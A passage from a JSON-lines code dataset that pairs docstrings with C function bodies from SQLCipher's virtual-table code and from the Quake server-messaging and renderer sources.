"sqlcipher/src/vtab.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "sqlcipher/sqlcipher", "stars": 5860, "license": "other", "language": "c", "size": 50337}
{"docstring": "/*\n** Add a new module argument to pTable->azModuleArg[].\n** The string is not copied - the pointer is stored.  The\n** string will be freed automatically when the table is\n** deleted.\n*/\n", "func_signal": "static void addModuleArgument(Parse *pParse, Table *pTable, char *zArg)", "code": "{\n  sqlite3_int64 nBytes = sizeof(char *)*(2+pTable->nModuleArg);\n  char **azModuleArg;\n  sqlite3 *db = pParse->db;\n  if( pTable->nModuleArg+3>=db->aLimit[SQLITE_LIMIT_COLUMN] ){\n    sqlite3ErrorMsg(pParse, \"too many columns on %s\", pTable->zName);\n  }\n  azModuleArg = sqlite3DbRealloc(db, pTable->azModuleArg, nBytes);\n  if( azModuleArg==0 ){\n    sqlite3DbFree(db, zArg);\n  }else{\n    int i = pTable->nModuleArg++;\n    azModuleArg[i] = zArg;\n    azModuleArg[i+1] = 0;\n    pTable->azModuleArg = azModuleArg;\n  }\n}", "path": "sqlcipher/src/vtab.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "sqlcipher/sqlcipher", "stars": 5860, "license": "other", "language": "c", "size": 50337}
{"docstring": "/*\n** pTab is a pointer to a Table structure representing a virtual-table.\n** Return a pointer to the VTable object used by connection db to access \n** this virtual-table, if one has been created, or NULL otherwise.\n*/\n", "func_signal": "VTable *sqlite3GetVTable(sqlite3 *db, Table *pTab)", "code": "{\n  VTable *pVtab;\n  assert( IsVirtual(pTab) );\n  for(pVtab=pTab->pVTable; pVtab && pVtab->db!=db; pVtab=pVtab->pNext);\n  return pVtab;\n}", "path": "sqlcipher/src/vtab.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "sqlcipher/sqlcipher", "stars": 5860, "license": "other", "language": "c", "size": 50337}
{"docstring": "/*\n** If the virtual table pVtab supports the transaction interface\n** (xBegin/xRollback/xCommit and optionally xSync) and a transaction is\n** not currently open, invoke the xBegin method now.\n**\n** If the xBegin call is successful, place the sqlite3_vtab pointer\n** in the sqlite3.aVTrans array.\n*/\n", "func_signal": "int sqlite3VtabBegin(sqlite3 *db, VTable *pVTab)", "code": "{\n  int rc = SQLITE_OK;\n  const sqlite3_module *pModule;\n\n  /* Special case: If db->aVTrans is NULL and db->nVTrans is greater\n  ** than zero, then this function is being called from within a\n  ** virtual module xSync() callback. It is illegal to write to \n  ** virtual module tables in this case, so return SQLITE_LOCKED.\n  */\n  if( sqlite3VtabInSync(db) ){\n    return SQLITE_LOCKED;\n  }\n  if( !pVTab ){\n    return SQLITE_OK;\n  } \n  pModule = pVTab->pVtab->pModule;\n\n  if( pModule->xBegin ){\n    int i;\n\n    /* If pVtab is already in the aVTrans array, return early */\n    for(i=0; i<db->nVTrans; i++){\n      if( db->aVTrans[i]==pVTab ){\n        return SQLITE_OK;\n      }\n    }\n\n    /* Invoke the xBegin method. If successful, add the vtab to the \n    ** sqlite3.aVTrans[] array. */\n    rc = growVTrans(db);\n    if( rc==SQLITE_OK ){\n      rc = pModule->xBegin(pVTab->pVtab);\n      if( rc==SQLITE_OK ){\n        int iSvpt = db->nStatement + db->nSavepoint;\n        addToVTrans(db, pVTab);\n        if( iSvpt && pModule->xSavepoint ){\n          pVTab->iSavepoint = iSvpt;\n          rc = pModule->xSavepoint(pVTab->pVtab, iSvpt-1);\n        }\n      }\n    }\n  }\n  return rc;\n}", "path": "sqlcipher/src/vtab.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "sqlcipher/sqlcipher", "stars": 5860, "license": "other", "language": "c", "size": 50337}
{"docstring": "/*\n** Check to see if virtual table module pMod can be have an eponymous\n** virtual table instance.  If it can, create one if one does not already\n** exist. Return non-zero if the eponymous virtual table instance exists\n** when this routine returns, and return zero if it does not exist.\n**\n** An eponymous virtual table instance is one that is named after its\n** module, and more importantly, does not require a CREATE VIRTUAL TABLE\n** statement in order to come into existance.  Eponymous virtual table\n** instances always exist.  They cannot be DROP-ed.\n**\n** Any virtual table module for which xConnect and xCreate are the same\n** method can have an eponymous virtual table instance.\n*/\n", "func_signal": "int sqlite3VtabEponymousTableInit(Parse *pParse, Module *pMod)", "code": "{\n  const sqlite3_module *pModule = pMod->pModule;\n  Table *pTab;\n  char *zErr = 0;\n  int rc;\n  sqlite3 *db = pParse->db;\n  if( pMod->pEpoTab ) return 1;\n  if( pModule->xCreate!=0 && pModule->xCreate!=pModule->xConnect ) return 0;\n  pTab = sqlite3DbMallocZero(db, sizeof(Table));\n  if( pTab==0 ) return 0;\n  pTab->zName = sqlite3DbStrDup(db, pMod->zName);\n  if( pTab->zName==0 ){\n    sqlite3DbFree(db, pTab);\n    return 0;\n  }\n  pMod->pEpoTab = pTab;\n  pTab->nTabRef = 1;\n  pTab->pSchema = db->aDb[0].pSchema;\n  assert( pTab->nModuleArg==0 );\n  pTab->iPKey = -1;\n  addModuleArgument(pParse, pTab, sqlite3DbStrDup(db, pTab->zName));\n  addModuleArgument(pParse, pTab, 0);\n  addModuleArgument(pParse, pTab, sqlite3DbStrDup(db, pTab->zName));\n  rc = vtabCallConstructor(db, pTab, pMod, pModule->xConnect, &zErr);\n  if( rc ){\n    sqlite3ErrorMsg(pParse, \"%s\", zErr);\n    sqlite3DbFree(db, zErr);\n    sqlite3VtabEponymousTableClear(db, pMod);\n    return 0;\n  }\n  return 1;\n}", "path": "sqlcipher/src/vtab.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "sqlcipher/sqlcipher", "stars": 5860, "license": "other", "language": "c", "size": 50337}
{"docstring": "/*\n** This function invokes either the xRollback or xCommit method\n** of each of the virtual tables in the sqlite3.aVTrans array. The method\n** called is identified by the second argument, \"offset\", which is\n** the offset of the method to call in the sqlite3_module structure.\n**\n** The array is cleared after invoking the callbacks. \n*/\n", "func_signal": "static void callFinaliser(sqlite3 *db, int offset)", "code": "{\n  int i;\n  if( db->aVTrans ){\n    VTable **aVTrans = db->aVTrans;\n    db->aVTrans = 0;\n    for(i=0; i<db->nVTrans; i++){\n      VTable *pVTab = aVTrans[i];\n      sqlite3_vtab *p = pVTab->pVtab;\n      if( p ){\n        int (*x)(sqlite3_vtab *);\n        x = *(int (**)(sqlite3_vtab *))((char *)p->pModule + offset);\n        if( x ) x(p);\n      }\n      pVTab->iSavepoint = 0;\n      sqlite3VtabUnlock(pVTab);\n    }\n    sqlite3DbFree(db, aVTrans);\n    db->nVTrans = 0;\n  }\n}", "path": "sqlcipher/src/vtab.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "sqlcipher/sqlcipher", "stars": 5860, "license": "other", "language": "c", "size": 50337}
{"docstring": "/*\n** Invoke the xRollback method of all virtual tables in the \n** sqlite3.aVTrans array. Then clear the array itself.\n*/\n", "func_signal": "int sqlite3VtabRollback(sqlite3 *db)", "code": "{\n  callFinaliser(db, offsetof(sqlite3_module,xRollback));\n  return SQLITE_OK;\n}", "path": "sqlcipher/src/vtab.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "sqlcipher/sqlcipher", "stars": 5860, "license": "other", "language": "c", "size": 50337}
{"docstring": "/*\n** This routine takes the module argument that has been accumulating\n** in pParse->zArg[] and appends it to the list of arguments on the\n** virtual table currently under construction in pParse->pTable.\n*/\n", "func_signal": "static void addArgumentToVtab(Parse *pParse)", "code": "{\n  if( pParse->sArg.z && pParse->pNewTable ){\n    const char *z = (const char*)pParse->sArg.z;\n    int n = pParse->sArg.n;\n    sqlite3 *db = pParse->db;\n    addModuleArgument(pParse, pParse->pNewTable, sqlite3DbStrNDup(db, z, n));\n  }\n}", "path": "sqlcipher/src/vtab.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "sqlcipher/sqlcipher", "stars": 5860, "license": "other", "language": "c", "size": 50337}
{"docstring": "/*\n** Clear any and all virtual-table information from the Table record.\n** This routine is called, for example, just before deleting the Table\n** record.\n**\n** Since it is a virtual-table, the Table structure contains a pointer\n** to the head of a linked list of VTable structures. Each VTable \n** structure is associated with a single sqlite3* user of the schema.\n** The reference count of the VTable structure associated with database \n** connection db is decremented immediately (which may lead to the \n** structure being xDisconnected and free). Any other VTable structures\n** in the list are moved to the sqlite3.pDisconnect list of the associated \n** database connection.\n*/\n", "func_signal": "void sqlite3VtabClear(sqlite3 *db, Table *p)", "code": "{\n  if( !db || db->pnBytesFreed==0 ) vtabDisconnectAll(0, p);\n  if( p->azModuleArg ){\n    int i;\n    for(i=0; i<p->nModuleArg; i++){\n      if( i!=1 ) sqlite3DbFree(db, p->azModuleArg[i]);\n    }\n    sqlite3DbFree(db, p->azModuleArg);\n  }\n}", "path": "sqlcipher/src/vtab.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "sqlcipher/sqlcipher", "stars": 5860, "license": "other", "language": "c", "size": 50337}
{"docstring": "/*\n==================\nSV_WriteClientdataToMessage\n\n==================\n*/\n", "func_signal": "void SV_WriteClientdataToMessage (client_t *client, sizebuf_t *msg)", "code": "{\n\tint\t\ti;\n\tedict_t\t*other;\n\tedict_t\t*ent;\n\n\tent = client->edict;\n\n\t// send the chokecount for r_netgraph\n\tif (client->chokecount)\n\t{\n\t\tMSG_WriteByte (msg, svc_chokecount);\n\t\tMSG_WriteByte (msg, client->chokecount);\n\t\tclient->chokecount = 0;\n\t}\n\n\t// send a damage message if the player got hit this frame\n\tif (ent->v.dmg_take || ent->v.dmg_save)\n\t{\n\t\tother = PROG_TO_EDICT(ent->v.dmg_inflictor);\n\t\tMSG_WriteByte (msg, svc_damage);\n\t\tMSG_WriteByte (msg, ent->v.dmg_save);\n\t\tMSG_WriteByte (msg, ent->v.dmg_take);\n\t\tfor (i=0 ; i<3 ; i++)\n\t\t\tMSG_WriteCoord (msg, other->v.origin[i] + 0.5*(other->v.mins[i] + other->v.maxs[i]));\n\t\n\t\tent->v.dmg_take = 0;\n\t\tent->v.dmg_save = 0;\n\t}\n\n\t// a fixangle might get lost in a dropped packet.  Oh well.\n\tif ( ent->v.fixangle )\n\t{\n\t\tMSG_WriteByte (msg, svc_setangle);\n\t\tfor (i=0 ; i < 3 ; i++)\n\t\t\tMSG_WriteAngle (msg, ent->v.angles[i] );\n\t\tent->v.fixangle = 0;\n\t}\n}", "path": "Quake/QW/server/sv_send.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake", "stars": 4494, "license": "None", "language": "c", "size": 2129}
{"docstring": "/*\n==================\nSV_FlushRedirect\n==================\n*/\n", "func_signal": "void SV_FlushRedirect (void)", "code": "{\n\tchar\tsend[8000+6];\n\n\tif (sv_redirected == RD_PACKET)\n\t{\n\t\tsend[0] = 0xff;\n\t\tsend[1] = 0xff;\n\t\tsend[2] = 0xff;\n\t\tsend[3] = 0xff;\n\t\tsend[4] = A2C_PRINT;\n\t\tmemcpy (send+5, outputbuf, strlen(outputbuf)+1);\n\n\t\tNET_SendPacket (strlen(send)+1, send, net_from);\n\t}\n\telse if (sv_redirected == RD_CLIENT)\n\t{\n\t\tClientReliableWrite_Begin (host_client, svc_print, strlen(outputbuf)+3);\n\t\tClientReliableWrite_Byte (host_client, PRINT_HIGH);\n\t\tClientReliableWrite_String (host_client, outputbuf);\n\t}\n\n\t// clear it\n\toutputbuf[0] = 0;\n}", "path": "Quake/QW/server/sv_send.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake", "stars": 4494, "license": "None", "language": "c", "size": 2129}
{"docstring": "/*\n=======================\nSV_SendClientMessages\n=======================\n*/\n", "func_signal": "void SV_SendClientMessages (void)", "code": "{\n\tint\t\t\ti, j;\n\tclient_t\t*c;\n\n// update frags, names, etc\n\tSV_UpdateToReliableMessages ();\n\n// build individual updates\n\tfor (i=0, c = svs.clients ; i<MAX_CLIENTS ; i++, c++)\n\t{\n\t\tif (!c->state)\n\t\t\tcontinue;\n\n\t\tif (c->drop) {\n\t\t\tSV_DropClient(c);\n\t\t\tc->drop = false;\n\t\t\tcontinue;\n\t\t}\n\n\t\t// check to see if we have a backbuf to stick in the reliable\n\t\tif (c->num_backbuf) {\n\t\t\t// will it fit?\n\t\t\tif (c->netchan.message.cursize + c->backbuf_size[0] <\n\t\t\t\tc->netchan.message.maxsize) {\n\n\t\t\t\tCon_DPrintf(\"%s: backbuf %d bytes\\n\",\n\t\t\t\t\tc->name, c->backbuf_size[0]);\n\n\t\t\t\t// it'll fit\n\t\t\t\tSZ_Write(&c->netchan.message, c->backbuf_data[0],\n\t\t\t\t\tc->backbuf_size[0]);\n\t\t\t\t\n\t\t\t\t//move along, move along\n\t\t\t\tfor (j = 1; j < c->num_backbuf; j++) {\n\t\t\t\t\tmemcpy(c->backbuf_data[j - 1], c->backbuf_data[j],\n\t\t\t\t\t\tc->backbuf_size[j]);\n\t\t\t\t\tc->backbuf_size[j - 1] = c->backbuf_size[j];\n\t\t\t\t}\n\n\t\t\t\tc->num_backbuf--;\n\t\t\t\tif (c->num_backbuf) {\n\t\t\t\t\tmemset(&c->backbuf, 0, sizeof(c->backbuf));\n\t\t\t\t\tc->backbuf.data = c->backbuf_data[c->num_backbuf - 1];\n\t\t\t\t\tc->backbuf.cursize = c->backbuf_size[c->num_backbuf - 1];\n\t\t\t\t\tc->backbuf.maxsize = sizeof(c->backbuf_data[c->num_backbuf - 1]);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\t// if the reliable message overflowed,\n\t\t// drop the client\n\t\tif (c->netchan.message.overflowed)\n\t\t{\n\t\t\tSZ_Clear (&c->netchan.message);\n\t\t\tSZ_Clear (&c->datagram);\n\t\t\tSV_BroadcastPrintf (PRINT_HIGH, \"%s overflowed\\n\", c->name);\n\t\t\tCon_Printf (\"WARNING: reliable overflow for %s\\n\",c->name);\n\t\t\tSV_DropClient (c);\n\t\t\tc->send_message = true;\n\t\t\tc->netchan.cleartime = 0;\t// don't choke this message\n\t\t}\n\n\t\t// only send messages if the client has sent one\n\t\t// and the bandwidth is not choked\n\t\tif (!c->send_message)\n\t\t\tcontinue;\n\t\tc->send_message = false;\t// try putting this after choke?\n\t\tif (!sv.paused && !Netchan_CanPacket (&c->netchan))\n\t\t{\n\t\t\tc->chokecount++;\n\t\t\tcontinue;\t\t// bandwidth choke\n\t\t}\n\n\t\tif (c->state == cs_spawned)\n\t\t\tSV_SendClientDatagram (c);\n\t\telse\n\t\t\tNetchan_Transmit (&c->netchan, 0, NULL);\t// just update reliable\n\t\t\t\n\t}\n}", "path": "Quake/QW/server/sv_send.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake", "stars": 4494, "license": "None", "language": "c", "size": 2129}
{"docstring": "/*\n=================\nSV_Multicast\n\nSends the contents of sv.multicast to a subset of the clients,\nthen clears sv.multicast.\n\nMULTICAST_ALL\tsame as broadcast\nMULTICAST_PVS\tsend to clients potentially visible from org\nMULTICAST_PHS\tsend to clients potentially hearable from org\n=================\n*/\n", "func_signal": "void SV_Multicast (vec3_t origin, int to)", "code": "{\n\tclient_t\t*client;\n\tbyte\t\t*mask;\n\tmleaf_t\t\t*leaf;\n\tint\t\t\tleafnum;\n\tint\t\t\tj;\n\tqboolean\treliable;\n\n\tleaf = Mod_PointInLeaf (origin, sv.worldmodel);\n\tif (!leaf)\n\t\tleafnum = 0;\n\telse\n\t\tleafnum = leaf - sv.worldmodel->leafs;\n\n\treliable = false;\n\n\tswitch (to)\n\t{\n\tcase MULTICAST_ALL_R:\n\t\treliable = true;\t// intentional fallthrough\n\tcase MULTICAST_ALL:\n\t\tmask = sv.pvs;\t\t// leaf 0 is everything;\n\t\tbreak;\n\n\tcase MULTICAST_PHS_R:\n\t\treliable = true;\t// intentional fallthrough\n\tcase MULTICAST_PHS:\n\t\tmask = sv.phs + leafnum * 4*((sv.worldmodel->numleafs+31)>>5);\n\t\tbreak;\n\n\tcase MULTICAST_PVS_R:\n\t\treliable = true;\t// intentional fallthrough\n\tcase MULTICAST_PVS:\n\t\tmask = sv.pvs + leafnum * 4*((sv.worldmodel->numleafs+31)>>5);\n\t\tbreak;\n\n\tdefault:\n\t\tmask = NULL;\n\t\tSV_Error (\"SV_Multicast: bad to:%i\", to);\n\t}\n\n\t// send the data to all relevent clients\n\tfor (j = 0, client = svs.clients; j < MAX_CLIENTS; j++, client++)\n\t{\n\t\tif (client->state != cs_spawned)\n\t\t\tcontinue;\n\n\t\tif (to == MULTICAST_PHS_R || to == MULTICAST_PHS) {\n\t\t\tvec3_t delta;\n\t\t\tVectorSubtract(origin, client->edict->v.origin, delta);\n\t\t\tif (Length(delta) <= 1024)\n\t\t\t\tgoto inrange;\n\t\t}\n\n\t\tleaf = Mod_PointInLeaf (client->edict->v.origin, sv.worldmodel);\n\t\tif (leaf)\n\t\t{\n\t\t\t// -1 is because pvs rows are 1 based, not 0 based like leafs\n\t\t\tleafnum = leaf - sv.worldmodel->leafs - 1;\n\t\t\tif ( !(mask[leafnum>>3] & (1<<(leafnum&7)) ) )\n\t\t\t{\n//\t\t\t\tCon_Printf (\"supressed multicast\\n\");\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\ninrange:\n\t\tif (reliable) {\n\t\t\tClientReliableCheckBlock(client, sv.multicast.cursize);\n\t\t\tClientReliableWrite_SZ(client, sv.multicast.data, sv.multicast.cursize);\n\t\t} else\n\t\t\tSZ_Write (&client->datagram, sv.multicast.data, sv.multicast.cursize);\n\t}\n\n\tSZ_Clear (&sv.multicast);\n}", "path": "Quake/QW/server/sv_send.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake", "stars": 4494, "license": "None", "language": "c", "size": 2129}
{"docstring": "/*\n=======================\nSV_SendClientDatagram\n=======================\n*/\n", "func_signal": "qboolean SV_SendClientDatagram (client_t *client)", "code": "{\n\tbyte\t\tbuf[MAX_DATAGRAM];\n\tsizebuf_t\tmsg;\n\n\tmsg.data = buf;\n\tmsg.maxsize = sizeof(buf);\n\tmsg.cursize = 0;\n\tmsg.allowoverflow = true;\n\tmsg.overflowed = false;\n\n\t// add the client specific data to the datagram\n\tSV_WriteClientdataToMessage (client, &msg);\n\n\t// send over all the objects that are in the PVS\n\t// this will include clients, a packetentities, and\n\t// possibly a nails update\n\tSV_WriteEntitiesToClient (client, &msg);\n\n\t// copy the accumulated multicast datagram\n\t// for this client out to the message\n\tif (client->datagram.overflowed)\n\t\tCon_Printf (\"WARNING: datagram overflowed for %s\\n\", client->name);\n\telse\n\t\tSZ_Write (&msg, client->datagram.data, client->datagram.cursize);\n\tSZ_Clear (&client->datagram);\n\n\t// send deltas over reliable stream\n\tif (Netchan_CanReliable (&client->netchan))\n\t\tSV_UpdateClientStats (client);\n\n\tif (msg.overflowed)\n\t{\n\t\tCon_Printf (\"WARNING: msg overflowed for %s\\n\", client->name);\n\t\tSZ_Clear (&msg);\n\t}\n\n\t// send the datagram\n\tNetchan_Transmit (&client->netchan, msg.cursize, buf);\n\n\treturn true;\n}", "path": "Quake/QW/server/sv_send.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake", "stars": 4494, "license": "None", "language": "c", "size": 2129}
{"docstring": "/*\n=================\nSV_ClientPrintf\n\nSends text across to be displayed if the level passes\n=================\n*/\n", "func_signal": "void SV_ClientPrintf (client_t *cl, int level, char *fmt, ...)", "code": "{\n\tva_list\t\targptr;\n\tchar\t\tstring[1024];\n\t\n\tif (level < cl->messagelevel)\n\t\treturn;\n\t\n\tva_start (argptr,fmt);\n\tvsprintf (string, fmt,argptr);\n\tva_end (argptr);\n\n\tSV_PrintToClient(cl, level, string);\n}", "path": "Quake/QW/server/sv_send.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake", "stars": 4494, "license": "None", "language": "c", "size": 2129}
{"docstring": "/*\n=============\nR_BmodelCheckBBox\n=============\n*/\n", "func_signal": "int R_BmodelCheckBBox (model_t *clmodel, float *minmaxs)", "code": "{\n\tint\t\t\ti, *pindex, clipflags;\n\tvec3_t\t\tacceptpt, rejectpt;\n\tdouble\t\td;\n\n\tclipflags = 0;\n\n\tif (currententity->angles[0] || currententity->angles[1]\n\t\t|| currententity->angles[2])\n\t{\n\t\tfor (i=0 ; i<4 ; i++)\n\t\t{\n\t\t\td = DotProduct (currententity->origin, view_clipplanes[i].normal);\n\t\t\td -= view_clipplanes[i].dist;\n\n\t\t\tif (d <= -clmodel->radius)\n\t\t\t\treturn BMODEL_FULLY_CLIPPED;\n\n\t\t\tif (d <= clmodel->radius)\n\t\t\t\tclipflags |= (1<<i);\n\t\t}\n\t}\n\telse\n\t{\n\t\tfor (i=0 ; i<4 ; i++)\n\t\t{\n\t\t// generate accept and reject points\n\t\t// FIXME: do with fast look-ups or integer tests based on the sign bit\n\t\t// of the floating point values\n\n\t\t\tpindex = pfrustum_indexes[i];\n\n\t\t\trejectpt[0] = minmaxs[pindex[0]];\n\t\t\trejectpt[1] = minmaxs[pindex[1]];\n\t\t\trejectpt[2] = minmaxs[pindex[2]];\n\t\t\t\n\t\t\td = DotProduct (rejectpt, view_clipplanes[i].normal);\n\t\t\td -= view_clipplanes[i].dist;\n\n\t\t\tif (d <= 0)\n\t\t\t\treturn BMODEL_FULLY_CLIPPED;\n\n\t\t\tacceptpt[0] = minmaxs[pindex[3+0]];\n\t\t\tacceptpt[1] = minmaxs[pindex[3+1]];\n\t\t\tacceptpt[2] = minmaxs[pindex[3+2]];\n\n\t\t\td = DotProduct (acceptpt, view_clipplanes[i].normal);\n\t\t\td -= view_clipplanes[i].dist;\n\n\t\t\tif (d <= 0)\n\t\t\t\tclipflags |= (1<<i);\n\t\t}\n\t}\n\n\treturn clipflags;\n}", "path": "Quake/WinQuake/r_main.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake", "stars": 4494, "license": "None", "language": "c", "size": 2129}
{"docstring": "/*\n===============\nR_MarkLeaves\n===============\n*/\n", "func_signal": "void R_MarkLeaves (void)", "code": "{\n\tbyte\t*vis;\n\tmnode_t\t*node;\n\tint\t\ti;\n\n\tif (r_oldviewleaf == r_viewleaf)\n\t\treturn;\n\t\n\tr_visframecount++;\n\tr_oldviewleaf = r_viewleaf;\n\n\tvis = Mod_LeafPVS (r_viewleaf, cl.worldmodel);\n\t\t\n\tfor (i=0 ; i<cl.worldmodel->numleafs ; i++)\n\t{\n\t\tif (vis[i>>3] & (1<<(i&7)))\n\t\t{\n\t\t\tnode = (mnode_t *)&cl.worldmodel->leafs[i+1];\n\t\t\tdo\n\t\t\t{\n\t\t\t\tif (node->visframe == r_visframecount)\n\t\t\t\t\tbreak;\n\t\t\t\tnode->visframe = r_visframecount;\n\t\t\t\tnode = node->parent;\n\t\t\t} while (node);\n\t\t}\n\t}\n}", "path": "Quake/WinQuake/r_main.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake", "stars": 4494, "license": "None", "language": "c", "size": 2129}
{"docstring": "/*\n=================\nSV_BroadcastPrintf\n\nSends text to all active clients\n=================\n*/\n", "func_signal": "void SV_BroadcastPrintf (int level, char *fmt, ...)", "code": "{\n\tva_list\t\targptr;\n\tchar\t\tstring[1024];\n\tclient_t\t*cl;\n\tint\t\t\ti;\n\n\tva_start (argptr,fmt);\n\tvsprintf (string, fmt,argptr);\n\tva_end (argptr);\n\t\n\tSys_Printf (\"%s\", string);\t// print to the console\n\n\tfor (i=0, cl = svs.clients ; i<MAX_CLIENTS ; i++, cl++)\n\t{\n\t\tif (level < cl->messagelevel)\n\t\t\tcontinue;\n\t\tif (!cl->state)\n\t\t\tcontinue;\n\n\t\tSV_PrintToClient(cl, level, string);\n\t}\n}", "path": "Quake/QW/server/sv_send.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake", "stars": 4494, "license": "None", "language": "c", "size": 2129}
{"docstring": "/*\n=============\nR_DrawEntitiesOnList\n=============\n*/\n", "func_signal": "void R_DrawEntitiesOnList (void)", "code": "{\n\tint\t\t\ti, j;\n\tint\t\t\tlnum;\n\talight_t\tlighting;\n// FIXME: remove and do real lighting\n\tfloat\t\tlightvec[3] = {-1, 0, 0};\n\tvec3_t\t\tdist;\n\tfloat\t\tadd;\n\n\tif (!r_drawentities.value)\n\t\treturn;\n\n\tfor (i=0 ; i<cl_numvisedicts ; i++)\n\t{\n\t\tcurrententity = cl_visedicts[i];\n\n\t\tif (currententity == &cl_entities[cl.viewentity])\n\t\t\tcontinue;\t// don't draw the player\n\n\t\tswitch (currententity->model->type)\n\t\t{\n\t\tcase mod_sprite:\n\t\t\tVectorCopy (currententity->origin, r_entorigin);\n\t\t\tVectorSubtract (r_origin, r_entorigin, modelorg);\n\t\t\tR_DrawSprite ();\n\t\t\tbreak;\n\n\t\tcase mod_alias:\n\t\t\tVectorCopy (currententity->origin, r_entorigin);\n\t\t\tVectorSubtract (r_origin, r_entorigin, modelorg);\n\n\t\t// see if the bounding box lets us trivially reject, also sets\n\t\t// trivial accept status\n\t\t\tif (R_AliasCheckBBox ())\n\t\t\t{\n\t\t\t\tj = R_LightPoint (currententity->origin);\n\t\n\t\t\t\tlighting.ambientlight = j;\n\t\t\t\tlighting.shadelight = j;\n\n\t\t\t\tlighting.plightvec = lightvec;\n\n\t\t\t\tfor (lnum=0 ; lnum<MAX_DLIGHTS ; lnum++)\n\t\t\t\t{\n\t\t\t\t\tif (cl_dlights[lnum].die >= cl.time)\n\t\t\t\t\t{\n\t\t\t\t\t\tVectorSubtract (currententity->origin,\n\t\t\t\t\t\t\t\t\t\tcl_dlights[lnum].origin,\n\t\t\t\t\t\t\t\t\t\tdist);\n\t\t\t\t\t\tadd = cl_dlights[lnum].radius - Length(dist);\n\t\n\t\t\t\t\t\tif (add > 0)\n\t\t\t\t\t\t\tlighting.ambientlight += add;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\n\t\t\t// clamp lighting so it doesn't overbright as much\n\t\t\t\tif (lighting.ambientlight > 128)\n\t\t\t\t\tlighting.ambientlight = 128;\n\t\t\t\tif (lighting.ambientlight + lighting.shadelight > 192)\n\t\t\t\t\tlighting.shadelight = 192 - lighting.ambientlight;\n\n\t\t\t\tR_AliasDrawModel (&lighting);\n\t\t\t}\n\n\t\t\tbreak;\n\n\t\tdefault:\n\t\t\tbreak;\n\t\t}\n\t}\n}", "path": "Quake/WinQuake/r_main.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake", "stars": 4494, "license": "None", "language": "c", "size": 2129}
{"docstring": "// FIXME: make a buffer size safe vsprintf?\n", "func_signal": "void Con_Printf (char *fmt, ...)", "code": "{\n\tva_list\t\targptr;\n\tchar\t\tmsg[MAXPRINTMSG];\n\t\n\tva_start (argptr,fmt);\n\tvsprintf (msg,fmt,argptr);\n\tva_end (argptr);\n\n\t// add to redirected message\n\tif (sv_redirected)\n\t{\n\t\tif (strlen (msg) + strlen(outputbuf) > sizeof(outputbuf) - 1)\n\t\t\tSV_FlushRedirect ();\n\t\tstrcat (outputbuf, msg);\n\t\treturn;\n\t}\n\n\tSys_Printf (\"%s\", msg);\t// also echo to debugging console\n\tif (sv_logfile)\n\t\tfprintf (sv_logfile, \"%s\", msg);\n}", "path": "Quake/QW/server/sv_send.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake", "stars": 4494, "license": "None", "language": "c", "size": 2129}
{"docstring": "/*\n================\nR_InitTurb\n================\n*/\n", "func_signal": "void R_InitTurb (void)", "code": "{\n\tint\t\ti;\n\t\n\tfor (i=0 ; i<(SIN_BUFFER_SIZE) ; i++)\n\t{\n\t\tsintable[i] = AMP + sin(i*3.14159*2/CYCLE)*AMP;\n\t\tintsintable[i] = AMP2 + sin(i*3.14159*2/CYCLE)*AMP2;\t// AMP2, not 20\n\t}\n}", "path": "Quake/WinQuake/r_main.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake", "stars": 4494, "license": "None", "language": "c", "size": 2129}
{"docstring": "/*\n================\nCon_DPrintf\n\nA Con_Printf that only shows up if the \"developer\" cvar is set\n================\n*/\n", "func_signal": "void Con_DPrintf (char *fmt, ...)", "code": "{\n\tva_list\t\targptr;\n\tchar\t\tmsg[MAXPRINTMSG];\n\n\tif (!developer.value)\n\t\treturn;\n\n\tva_start (argptr,fmt);\n\tvsprintf (msg,fmt,argptr);\n\tva_end (argptr);\n\t\n\tCon_Printf (\"%s\", msg);\n}", "path": "Quake/QW/server/sv_send.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake", "stars": 4494, "license": "None", "language": "c", "size": 2129}
{"docstring": "/*\n===============\nR_Init\n===============\n*/\n", "func_signal": "void R_Init (void)", "code": "{\n\tint\t\tdummy;\n\t\n// get stack position so we can guess if we are going to overflow\n\tr_stack_start = (byte *)&dummy;\n\t\n\tR_InitTurb ();\n\t\n\tCmd_AddCommand (\"timerefresh\", R_TimeRefresh_f);\t\n\tCmd_AddCommand (\"pointfile\", R_ReadPointFile_f);\t\n\n\tCvar_RegisterVariable (&r_draworder);\n\tCvar_RegisterVariable (&r_speeds);\n\tCvar_RegisterVariable (&r_timegraph);\n\tCvar_RegisterVariable (&r_graphheight);\n\tCvar_RegisterVariable (&r_drawflat);\n\tCvar_RegisterVariable (&r_ambient);\n\tCvar_RegisterVariable (&r_clearcolor);\n\tCvar_RegisterVariable (&r_waterwarp);\n\tCvar_RegisterVariable (&r_fullbright);\n\tCvar_RegisterVariable (&r_drawentities);\n\tCvar_RegisterVariable (&r_drawviewmodel);\n\tCvar_RegisterVariable (&r_aliasstats);\n\tCvar_RegisterVariable (&r_dspeeds);\n\tCvar_RegisterVariable (&r_reportsurfout);\n\tCvar_RegisterVariable (&r_maxsurfs);\n\tCvar_RegisterVariable (&r_numsurfs);\n\tCvar_RegisterVariable 